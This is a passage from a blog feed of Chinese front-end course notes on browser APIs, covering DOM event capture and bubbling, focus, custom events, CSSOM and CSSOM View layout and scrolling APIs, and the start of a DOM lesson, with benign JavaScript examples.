class="string">&quot;TextEncoderStream&quot;</span>])<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>我们继续来看下一个属性。</p><h2 id="Web-Background-Synchronization"><a href="#Web-Background-Synchronization" class="headerlink" title="Web Background Synchronization"></a>Web Background Synchronization</h2><p>下一个属性是 SyncManager，这个属性比较特殊，它并没有被标准化，但是我们仍然可以找到它的来源文档：</p><ul><li><a href="https://wicg.github.io/BackgroundSync/spec/#sync-manager-interface">https://wicg.github.io/BackgroundSync/spec/#sync-manager-interface</a></li></ul><p>这个属性我们就不多说了，过滤掉就好了。</p><h2 id="Web-Cryptography-API"><a href="#Web-Cryptography-API" class="headerlink" title="Web Cryptography API"></a>Web Cryptography API</h2><p>我们继续看下去，下一个属性是 SubtleCrypto，这个属性来自 Web Cryptography API，也是 W3C 的标准。</p><ul><li><a href="https://www.w3.org/TR/WebCryptoAPI/">https://www.w3.org/TR/WebCryptoAPI/</a></li></ul><p>这份标准中规定了三个 Class 和一个 Window 对象的扩展，给 Window 对象添加了一个属性 crypto。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">names</span> = filterOut(names, [<span class="string">&quot;CryptoKey&quot;</span>, <span class="string">&quot;SubtleCrypto&quot;</span>, <span class="string">&quot;Crypto&quot;</span>, <span class="string">&quot;crypto&quot;</span>])<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>我们继续来看。</p><h2 id="Media-Source-Extensions"><a href="#Media-Source-Extensions" class="headerlink" title="Media Source Extensions"></a>Media Source Extensions</h2><p>下一个属性是 SourceBufferList，它来自于：</p><ul><li><a href="https://www.w3.org/TR/media-source/">https://www.w3.org/TR/media-source/</a></li></ul><p><a href="https://www.w3.org/TR/media-source/">https://www.w3.org/TR/media-source/</a></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">names</span> = filterOut(names, [<span class="string">&quot;MediaSource&quot;</span>, <span class="string">&quot;SourceBuffer&quot;</span>, <span class="string">&quot;SourceBufferList&quot;</span>])<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>我们继续看下一个属性。</p><h2 id="The-Screen-Orientation-API"><a href="#The-Screen-Orientation-API" class="headerlink" title="The Screen Orientation API"></a>The Screen Orientation API</h2><p>下一个属性是 ScreenOrientation，它来自 W3C 的 The Screen Orientation API 标准：</p><ul><li><a href="https://www.w3.org/TR/screen-orientation/">https://www.w3.org/TR/screen-orientation/</a></li></ul><p>它里面只有 ScreenOrientation 一个接口，也是可以过滤掉的。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>到 Screen Orientation API，我这里看到还剩 300 余个属性没有处理，剩余部分，我想把它留给大家自己来完成。</p><p>我们可以看到，在整理 API 的过程中，我们可以找到各种不同组织的标准，比如：</p><ul><li>ECMA402 标准来自 ECMA；</li><li>Encoding 标准来自 WHATWG；</li><li>WebGL 标准来自 Khronos；</li><li>Web Cryptography 标准来自 W3C；</li><li>还有些 API，根本没有被标准化。</li></ul><p>浏览器环境的 API，正是这样复杂的环境。我们平时编程面对的环境也是这样的一个环境。</p><p>所以，面对如此繁复的 API，我建议在系统掌握 DOM、CSSOM 的基础上，你可以仅仅做大概的浏览和记忆，根据实际工作需要，选择其中几个来深入学习。</p><p>做完这个实验，你对 Web API 的理解应该会有很大提升。</p>]]></content>
      
      
      <categories>
          
          <category> relearnFE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>33丨浏览器：事件-为什么会有捕获过程和冒泡过程？</title>
      <link href="/Blog/2019/01/30/relearn_FE/33%E4%B8%A8%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%9A%E4%BA%8B%E4%BB%B6-%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E6%9C%89%E6%8D%95%E8%8E%B7%E8%BF%87%E7%A8%8B%E5%92%8C%E5%86%92%E6%B3%A1%E8%BF%87%E7%A8%8B%EF%BC%9F/index/"/>
      <url>/Blog/2019/01/30/relearn_FE/33%E4%B8%A8%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%9A%E4%BA%8B%E4%BB%B6-%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E6%9C%89%E6%8D%95%E8%8E%B7%E8%BF%87%E7%A8%8B%E5%92%8C%E5%86%92%E6%B3%A1%E8%BF%87%E7%A8%8B%EF%BC%9F/index/</url>
      
        <content type="html"><![CDATA[<h2 id="事件概述"><a href="#事件概述" class="headerlink" title="事件概述"></a>事件概述</h2><p>在开始接触具体的 API 之前，我们要先了解一下事件。一般来说，事件来自输入设备，我们平时的个人设备上，输入设备有三种：</p><ul><li>键盘；</li><li>鼠标；</li><li>触摸屏。</li></ul><p><strong>这其中，触摸屏和鼠标又有一定的共性，它们被称作 pointer 设备，所谓 pointer 设备，是指它的输入最终会被抽象成屏幕上面的一个点。</strong>但是触摸屏和鼠标又有一定区别，它们的精度、反应时间和支持的点的数量都不一样。</p><p>我们现代的 UI 系统，都源自 WIMP 系统。WIMP 即 Window Icon Menu Pointer 四个要素，它最初由施乐公司研发，后来被微软和苹果两家公司应用在了自己的操作系统上（关于这个还有一段有趣的故事，我附在文末了）。</p><p>WIMP 是如此成功，以至于今天很多的前端工程师会有一个观点，认为我们能够“点击一个按钮”，实际上并非如此，我们只能够点击鼠标上的按钮或者触摸屏，是操作系统和浏览器把这个信息对应到了一个逻辑上的按钮，再使得它的视图对点击事件有反应。这就引出了我们第一个要讲解的机制：捕获与冒泡。</p><h2 id="捕获与冒泡"><a href="#捕获与冒泡" class="headerlink" title="捕获与冒泡"></a>捕获与冒泡</h2><p>很多文章会讲到捕获过程是从外向内，冒泡过程是从内向外，但是这里我希望讲清楚，为什么会有捕获过程和冒泡过程。</p><p>我们刚提到，实际上点击事件来自触摸屏或者鼠标，鼠标点击并没有位置信息，但是一般操作系统会根据位移的累积计算出来，跟触摸屏一样，提供一个坐标给浏览器。</p><p>那么，把这个坐标转换为具体的元素上事件的过程，就是捕获过程了。而冒泡过程，则是符合人类理解逻辑的：当你按电视机开关时，你也按到了电视机。</p><p>所以我们可以认为，捕获是计算机处理事件的逻辑，而冒泡是人类处理事件的逻辑。</p><p>以下代码展示了事件传播顺序：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;i&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">document.body.addEventListener(<span class="string">&quot;mousedown&quot;</span>, <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  console.log(<span class="string">&quot;key1&quot;</span>)</span><br><span class="line">&#125;, <span class="literal">true</span>)</span><br><span class="line">document.getElementById(<span class="string">&quot;i&quot;</span>).addEventListener(<span class="string">&quot;mousedown&quot;</span>, <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  console.log(<span class="string">&quot;key2&quot;</span>)</span><br><span class="line">&#125;, <span class="literal">true</span>)</span><br><span class="line">document.body.addEventListener(<span class="string">&quot;mousedown&quot;</span>, <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  console.log(<span class="string">&quot;key11&quot;</span>)</span><br><span class="line">&#125;, <span class="literal">false</span>)</span><br><span class="line">document.getElementById(<span class="string">&quot;i&quot;</span>).addEventListener(<span class="string">&quot;mousedown&quot;</span>, <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  console.log(<span class="string">&quot;key22&quot;</span>)</span><br><span class="line">&#125;, <span class="literal">false</span>)</span><br></pre></td></tr></table></figure><p>我们监听了 body 和一个 body 的子元素上的鼠标按下事件，捕获和冒泡分别监听，可以看到，最终产生的顺序是：</p><ul><li>“key1”</li><li>“key2”</li><li>“key22”</li><li>“key11”</li></ul><p>这是捕获和冒泡发生的完整顺序。</p><p>在一个事件发生时，捕获过程跟冒泡过程总是先后发生，跟你是否监听毫无关联。</p><p>在我们实际监听事件时，我建议这样使用冒泡和捕获机制：默认使用冒泡模式，当开发组件时，遇到需要父元素控制子元素的行为，可以使用捕获机制。</p><p>理解了冒泡和捕获的过程，我们再看监听事件的 API，就非常容易理解了。</p><p>addEventListener 有三个参数：</p><ul><li>事件名称；</li><li>事件处理函数；</li><li>捕获还是冒泡。</li></ul><p>事件处理函数不一定是函数，也可以是个 JavaScript 具有 handleEvent 方法的对象，看下例子：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">  <span class="attr">handleEvent</span>: <span class="function"><span class="params">event</span> =&gt;</span> <span class="built_in">console</span>.<span class="built_in">log</span>(event)</span><br><span class="line">&#125;</span><br><span class="line">document.body.addEventListener(<span class="string">&quot;keydown&quot;</span>, o, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p>第三个参数不一定是 bool 值，也可以是个对象，它提供了更多选项。</p><ul><li>once：只执行一次。</li><li>passive：承诺此事件监听不会调用 preventDefault，这有助于性能。</li><li>useCapture：是否捕获（否则冒泡）。</li></ul><p>实际使用，在现代浏览器中，还可以不传第三个参数，我建议默认不传第三个参数，因为我认为冒泡是符合正常的人类心智模型的，大部分业务开发者不需要关心捕获过程。除非你是组件或者库的使用者，那就总是需要关心冒泡和捕获了。</p><h2 id="焦点"><a href="#焦点" class="headerlink" title="焦点"></a>焦点</h2><p>我们讲完了 pointer 事件是由坐标控制，而我们还没有讲到键盘事件。</p><p>键盘事件是由焦点系统控制的，一般来说，操作系统也会提供一套焦点系统，但是现代浏览器一般都选择在自己的系统内覆盖原本的焦点系统。</p><p>焦点系统也是视障用户访问的重要入口，所以设计合理的焦点系统是非常重要的产品需求，尤其是不少国家对可访问性有明确的法律要求。</p><p>在旧时代，有一个经典的问题是如何去掉输入框上的虚线框，这个虚线框就是 Windows 焦点系统附带的 UI 表现。</p><p>现在 Windows 的焦点已经不是用虚线框表示了，但是焦点系统的设计几十年间没有太大变化。</p><p>焦点系统认为整个 UI 系统中，有且仅有一个“聚焦”的元素，所有的键盘事件的目标元素都是这个聚焦元素。</p><p>Tab 键被用来切换到下一个可聚焦的元素，焦点系统占用了 Tab 键，但是可以用 JavaScript 来阻止这个行为。</p><p>浏览器 API 还提供了 API 来操作焦点，如：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">document.body.focus()<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">document.body.blur()<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>其实原本键盘事件不需要捕获过程，但是为了跟 pointer 设备保持一致，也规定了从外向内传播的捕获过程。</p><h2 id="自定义事件"><a href="#自定义事件" class="headerlink" title="自定义事件"></a>自定义事件</h2><p>除了来自输入设备的事件，还可以自定义事件，实际上事件也是一种非常好的代码架构，但是 DOM API 中的事件并不能用于普通对象，所以很遗憾，我们只能在 DOM 元素上使用自定义事件。</p><p>自定义事件的代码示例如下（来自 MDN）：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var evt = <span class="keyword">new</span> <span class="constructor">Event(<span class="string">&quot;look&quot;</span>, &#123;<span class="string">&quot;bubbles&quot;</span>:<span class="params">true</span>, <span class="string">&quot;cancelable&quot;</span>:<span class="params">false</span>&#125;)</span>;</span><br><span class="line">document.dispatch<span class="constructor">Event(<span class="params">evt</span>)</span>;</span><br></pre></td></tr></table></figure><p>这里使用 Event 构造器来创造了一个新的事件，然后调用 dispatchEvent 来在特定元素上触发。</p><p>我们可以给这个 Event 添加自定义属性、方法。</p><p>注意，这里旧的自定义事件方法（使用 document.createEvent 和 initEvent）已经被废弃。</p><hr><h3 id="WIMP-的小故事"><a href="#WIMP-的小故事" class="headerlink" title="WIMP 的小故事"></a>WIMP 的小故事</h3><p>WIMP 是由 Alan Kay 主导设计的，这位巨匠，同时也是面向对象之父和 Smalltalk 语言之父。</p><p>乔布斯曾经受邀参观施乐，他见到当时的 WIMP 界面，认为非常惊艳，不久后就领导苹果研究了新一代麦金塔系统。</p><p>后来，在某次当面对话中，乔布斯指责比尔盖茨抄袭了 WIMP 的设计，盖茨淡定地回答：“史蒂夫，我觉得应该用另一种方式看待这个问题。这就像我们有个叫施乐的有钱邻居，当我闯进去想偷走电视时，却发现你已经这么干了。”</p><p>但是不论如何，苹果和微软的数十代操作系统，极大地发展了这个体系，才有了我们今天的 UI 界面。</p>]]></content>
      
      
      <categories>
          
          <category> relearnFE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>32丨浏览器：CSSOM</title>
      <link href="/Blog/2019/01/30/relearn_FE/32%E4%B8%A8%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%9ACSSOM/index/"/>
      <url>/Blog/2019/01/30/relearn_FE/32%E4%B8%A8%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%9ACSSOM/index/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在前面的文章中，我们已经学习了 DOM 相关的 API，狭义的 DOM API 仅仅包含 DOM 树形结构相关的内容。今天，我们再来学习一类新的 API：CSSOM。</p></blockquote><p>我想，你在最初接触浏览器 API 的时候，应该都有跟我类似的想法：“好想要 element.width、element.height 这样的 API 啊”。</p><p>这样的 API 可以直接获取元素的显示相关信息，它们是非常符合人的第一印象直觉的设计，但是，偏偏 DOM API 中没有这样的内容。</p><p>随着学习的深入，我才知道，这样的设计是有背后的逻辑的，正如 HTML 和 CSS 分别承担了语义和表现的分工，DOM 和 CSSOM 也有语义和表现的分工。</p><p>DOM 中的所有的属性都是用来表现语义的属性，CSSOM 的则都是表现的属性，width 和 height 这类显示相关的属性，都属于我们今天要讲的 CSSOM。</p><p>顾名思义，CSSOM 是 CSS 的对象模型，在 W3C 标准中，它包含两个部分：描述样式表和规则等 CSS 的模型部分（CSSOM），和跟元素视图相关的 View 部分（CSSOM View）。</p><p>在实际使用中，CSSOM View 比 CSSOM 更常用一些，因为我们很少需要用代码去动态地管理样式表。</p><h2 id="CSSOM"><a href="#CSSOM" class="headerlink" title="CSSOM"></a>CSSOM</h2><p>首先我们来介绍下 CSS 中样式表的模型，也就是 CSSOM 的本体。</p><p>我们通常创建样式表也都是使用 HTML 标签来做到的，我们用 style 标签和 link 标签创建样式表，例如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">title</span>=<span class="string">&quot;Hello&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">a</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">color</span>:red;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">title</span>=<span class="string">&quot;x&quot;</span> <span class="attr">href</span>=<span class="string">&quot;data:text/css,p%7Bcolor:blue%7D&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们创建好样式表后，还有可能要对它进行一些操作。如果我们以 DOM 的角度去理解的话，这些标签在 DOM 中是一个节点，它们有节点的内容、属性，这两个标签中，CSS 代码有的在属性、有的在子节点。这两个标签也遵循 DOM 节点的操作规则，所以可以使用 DOM API 去访问。</p><p>但是，这样做的后果是我们需要去写很多分支逻辑，并且，要想解析 CSS 代码结构也不是一件简单的事情，所以，这种情况下，我们直接使用 CSSOM API 去操作它们生成的样式表，这是一个更好的选择。</p><p>我们首先了解一下 CSSOM API 的基本用法，一般来说，我们需要先获取文档中所有的样式表：</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.styleSheets</span><br></pre></td></tr></table></figure><p>document 的 styleSheets 属性表示文档中的所有样式表，这是一个只读的列表，我们可以用方括号运算符下标访问样式表，也可以使用 item 方法来访问，它有 length 属性表示文档中的样式表数量。</p><p>样式表只能使用 style 标签或者 link 标签创建（对 XML 来说，还可以使用，咱们暂且不表）。</p><p>我们虽然无法用 CSSOM API 来创建样式表，但是我们可以修改样式表中的内容。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">document<span class="selector-class">.styleSheets</span><span class="selector-attr">[0]</span><span class="selector-class">.insertRule</span>(<span class="string">&quot;p &#123; color:pink; &#125;&quot;</span>, <span class="number">0</span>)</span><br><span class="line">document<span class="selector-class">.styleSheets</span><span class="selector-attr">[0]</span><span class="selector-class">.removeRule</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>更进一步，我们可以获取样式表中特定的规则（Rule），并且对它进行一定的操作，具体来说，就是使用它的 cssRules 属性来实现：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document<span class="selector-class">.styleSheets</span><span class="selector-attr">[0]</span>.cssRules</span><br></pre></td></tr></table></figure><p>这里取到的规则列表，同样是支持 item、length 和下标运算。</p><p>不过，这里的 Rules 可就没那么简单了，它可能是 CSS 的 at-rule，也可能是普通的样式规则。不同的 rule 类型，具有不同的属性。</p><p>我们在 CSS 语法部分，已经为你整理过 at-rule 的完整列表，多数 at-rule 都对应着一个 rule 类型：</p><ul><li>CSSStyleRule</li><li>CSSCharsetRule</li><li>CSSImportRule</li><li>CSSMediaRule</li><li>CSSFontFaceRule</li><li>CSSPageRule</li><li>CSSNamespaceRule</li><li>CSSKeyframesRule</li><li>CSSKeyframeRule</li><li>CSSSupportsRule</li></ul><p>具体的规则支持的属性，建议你可以用到的时候，再去查阅 MDN 或者 W3C 的文档，在我们的文章中，仅为你详细介绍最常用的 CSSStyleRule。</p><p>CSSStyleRule 有两个属性：selectorText 和 style，分别表示一个规则的选择器部分和样式部分。</p><p>selector 部分是一个字符串，这里显然偷懒了没有设计进一步的选择器模型，我们按照选择器语法设置即可。</p><p>style 部分是一个样式表，它跟我们元素的 style 属性是一样的类型，所以我们可以像修改内联样式一样，直接改变属性修改规则中的具体 CSS 属性定义，也可以使用 cssText 这样的工具属性。</p><p>此外，CSSOM 还提供了一个非常重要的方法，来获取一个元素最终经过 CSS 计算得到的属性：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.get<span class="constructor">ComputedStyle(<span class="params">elt</span>, <span class="params">pseudoElt</span>)</span>;</span><br></pre></td></tr></table></figure><p>其中第一个参数就是我们要获取属性的元素，第二个参数是可选的，用于选择伪元素。</p><p>好了，到此为止，我们可以使用 CSSOM API 自由地修改页面已经生效的样式表了。接下来，我们来一起关注一下视图的问题。</p><h2 id="CSSOM-View"><a href="#CSSOM-View" class="headerlink" title="CSSOM View"></a>CSSOM View</h2><p>CSSOM View 这一部分的 API，可以视为 DOM API 的扩展，它在原本的 Element 接口上，添加了显示相关的功能，这些功能，又可以分成三个部分：窗口部分，滚动部分和布局部分，下面我来分别带你了解一下。</p><h2 id="窗口-API"><a href="#窗口-API" class="headerlink" title="窗口 API"></a>窗口 API</h2><p>窗口 API 用于操作浏览器窗口的位置、尺寸等。</p><ul><li>moveTo(x, y) 窗口移动到屏幕的特定坐标；</li><li>moveBy(x, y) 窗口移动特定距离；</li><li>resizeTo(x, y) 改变窗口大小到特定尺寸；</li><li>resizeBy(x, y) 改变窗口大小特定尺寸。</li></ul><p>此外，窗口 API 还规定了 window.open() 的第三个参数：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">window</span>.<span class="keyword">open</span>(&quot;about:blank&quot;, &quot;_blank&quot; ,&quot;width=100,height=100,left=100,right=100&quot; )</span><br></pre></td></tr></table></figure><p>一些浏览器出于安全考虑没有实现，也不适用于移动端浏览器，这部分你仅需简单了解即可。下面我们来了解一下滚动 API。</p><h2 id="滚动-API"><a href="#滚动-API" class="headerlink" title="滚动 API"></a>滚动 API</h2><p>可视区域（视口）滚动行为由 window 对象上的一组 API 控制，我们先来了解一下：</p><ul><li>scrollX 是视口的属性，表示 X 方向上的当前滚动距离，有别名 pageXOffset；</li><li>scrollY 是视口的属性，表示 Y 方向上的当前滚动距离，有别名 pageYOffset；</li><li>scroll(x, y) 使得页面滚动到特定的位置，有别名 scrollTo，支持传入配置型参数 {top, left}；</li><li>scrollBy(x, y) 使得页面滚动特定的距离，支持传入配置型参数 {top, left}。</li></ul><p>通过这些属性和方法，我们可以读取视口的滚动位置和操纵视口滚动。不过，要想监听视口滚动事件，我们需要在 document 对象上绑定事件监听函数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;scroll&quot;</span>, <span class="keyword">function</span>(<span class="params">event</span>)&#123;</span><br><span class="line">  <span class="comment">//......</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>视口滚动 API 是页面的顶层容器的滚动，大部分移动端浏览器都会采用一些性能优化，它和元素滚动不完全一样，请大家一定建立这个区分的意识。</p><h2 id="元素滚动-API"><a href="#元素滚动-API" class="headerlink" title="元素滚动 API"></a>元素滚动 API</h2><p>接下来我们来认识一下元素滚动 API，在 Element 类（参见 DOM 部分），为了支持滚动，加入了以下 API。</p><ul><li>scrollTop 元素的属性，表示 Y 方向上的当前滚动距离。</li><li>scrollLeft 元素的属性，表示 X 方向上的当前滚动距离。</li><li>scrollWidth 元素的属性，表示元素内部的滚动内容的宽度，一般来说会大于等于元素宽度。</li><li>scrollHeight 元素的属性，表示元素内部的滚动内容的高度，一般来说会大于等于元素高度。</li><li>scroll(x, y) 使得元素滚动到特定的位置，有别名 scrollTo，支持传入配置型参数 {top, left}。</li><li>scrollBy(x, y) 使得元素滚动到特定的位置，支持传入配置型参数 {top, left}。</li><li>scrollIntoView(arg) 滚动元素所在的父元素，使得元素滚动到可见区域，可以通过 arg 来指定滚到中间、开始或者就近。</li></ul><p>除此之外，可滚动的元素也支持 scroll 事件，我们在元素上监听它的事件即可：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">element.add<span class="constructor">EventListener(<span class="string">&quot;scroll&quot;</span>, <span class="params">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="comment">//......</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这里你需要注意一点，元素部分的 API 设计与视口滚动命名风格上略有差异，你在使用的时候不要记混。</p><h2 id="布局-API"><a href="#布局-API" class="headerlink" title="布局 API"></a>布局 API</h2><p>最后我们来介绍一下布局 API，这是整个 CSSOM 中最常用到的部分，我们同样要分成全局 API 和元素上的 API。</p><h2 id="全局尺寸信息"><a href="#全局尺寸信息" class="headerlink" title="全局尺寸信息"></a>全局尺寸信息</h2><p>window 对象上提供了一些全局的尺寸信息，它是通过属性来提供的，我们一起来了解一下来这些属性。</p><p><img src="/Blog/2019/01/30/relearn_FE/32%E4%B8%A8%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%9ACSSOM/index/img.png"></p><ul><li>window.innerHeight, window.innerWidth 这两个属性表示视口的大小。</li><li>window.outerWidth, window.outerHeight 这两个属性表示浏览器窗口占据的大小，很多浏览器没有实现，一般来说这两个属性无关紧要。</li><li>window.devicePixelRatio 这个属性非常重要，表示物理像素和 CSS 像素单位的倍率关系，Retina 屏这个值是 2，后来也出现了一些 3 倍的 Android 屏。</li><li>window.screen （屏幕尺寸相关的信息）<ul><li>window.screen.width, window.screen.height 设备的屏幕尺寸。</li><li>window.screen.availWidth, window.screen.availHeight 设备屏幕的可渲染区域尺寸，一些 Android 机器会把屏幕的一部分预留做固定按钮，所以有这两个属性，实际上一般浏览器不会实现的这么细致。</li><li>window.screen.colorDepth, window.screen.pixelDepth 这两个属性是固定值 24，应该是为了以后预留。</li></ul></li></ul><p>虽然 window 有这么多相关信息，在我看来，我们主要使用的是 innerHeight、innerWidth 和 devicePixelRatio 三个属性，因为我们前端开发工作只需要跟视口打交道，其它信息大概了解即可。</p><h2 id="元素的布局信息"><a href="#元素的布局信息" class="headerlink" title="元素的布局信息"></a>元素的布局信息</h2><p>最后我们来到了本节课一开始提到的问题，我们是否能够取到一个元素的宽（width）和高（height）呢？</p><p>实际上，我们首先应该从脑中消除“元素有宽高”这样的概念，我们课程中已经多次提到了，有些元素可能产生多个盒，事实上，只有盒有宽和高，元素是没有的。</p><p>所以我们获取宽高的对象应该是“盒”，于是 CSSOM View 为 Element 类添加了两个方法：</p><ul><li>getClientRects();</li><li>getBoundingClientRect()。</li></ul><p>getClientRects 会返回一个列表，里面包含元素对应的每一个盒所占据的客户端矩形区域，这里每一个矩形区域可以用 x, y, width, height 来获取它的位置和尺寸。</p><p>getBoundingClientRect ，这个 API 的设计更接近我们脑海中的元素盒的概念，它返回元素对应的所有盒的包裹的矩形区域，需要注意，这个 API 获取的区域会包括当 overflow 为 visible 时的子元素区域。</p><p>根据实际的精确度需要，我们可以选择何时使用这两个 API。</p><p>这两个 API 获取的矩形区域都是相对于视口的坐标，这意味着，这些区域都是受滚动影响的。</p><p>如果我们要获取相对坐标，或者包含滚动区域的坐标，需要一点小技巧：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var offsetX <span class="operator">=</span> document.documentElement.getBoundingClientRect().x - element.getBoundingClientRect().x<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>如这段代码所示，我们只需要获取文档跟节点的位置，再相减即可得到它们的坐标。</p><p>这两个 API 的兼容性非常好，定义又非常清晰，建议你如果是用 JavaScript 实现视觉效果时，尽量使用这两个 API。</p>]]></content>
      
      
      <categories>
          
          <category> relearnFE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>31丨浏览器：DOM</title>
      <link href="/Blog/2019/01/30/relearn_FE/31%E4%B8%A8%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%9ADOM/index/"/>
      <url>/Blog/2019/01/30/relearn_FE/31%E4%B8%A8%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%9ADOM/index/</url>
      
        <content type="html"><![CDATA[<blockquote><p>DOM API 是最早被设计出来的一批 API，也是用途最广的 API，所以早年的技术社区，常常用 DOM 来泛指浏览器中所有的 API。不过今天这里我们要介绍的 DOM，指的就是狭义的文档对象模型。</p></blockquote><h2 id="DOM-API-介绍"><a href="#DOM-API-介绍" class="headerlink" title="DOM API 介绍"></a>DOM API 介绍</h2><p>顾名思义，文档对象模型是用来描述文档，这里的文档，是特指 HTML 文档（也用于 XML 文档，但是本课不讨论 XML）。同时它又是一个“对象模型”，这意味着它使用的是对象这样的概念来描述 HTML 文档。</p><p>说起 HTML 文档，这是大家最熟悉的东西了，我们都知道，HTML 文档是一个由标签嵌套而成的树形结构，因此，DOM 也是使用树形的对象模型来描述一个 HTML 文档。</p><p>DOM API 大致会包含 4 个部分。</p><ul><li>节点：DOM 树形结构中的节点相关 API。</li><li>事件：触发和监听事件相关 API。</li><li>Range：操作文字范围相关 API。</li><li>遍历：遍历 DOM 需要的 API。</li></ul><p>事件相关 API 和事件模型，我们会用单独的课程讲解，所以我们本篇文章重点会为你介绍节点和遍历相关 API。</p><p>DOM API 数量很多，我希望给你提供一个理解 DOM API 设计的思路，避免单靠机械的方式去死记硬背。</p><h2 id="节点"><a href="#节点" class="headerlink" title="节点"></a>节点</h2><p>DOM 的树形结构所有的节点有统一的接口 Node，我们按照继承关系，给你介绍一下节点的类型。</p><p><img src="/Blog/2019/01/30/relearn_FE/31%E4%B8%A8%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%9ADOM/index/img.png"></p><p>在这些节点中，除了 Document 和 DocumentFrangment，都有与之对应的 HTML 写法，我们可以看一下。</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">Element: <span class="tag">&lt;<span class="name">tagname</span>&gt;</span>...<span class="tag">&lt;/<span class="name">tagname</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">Text: text</span></span><br><span class="line"><span class="language-xml">Comment: <span class="comment">&lt;!-- comments --&gt;</span></span></span><br><span class="line"><span 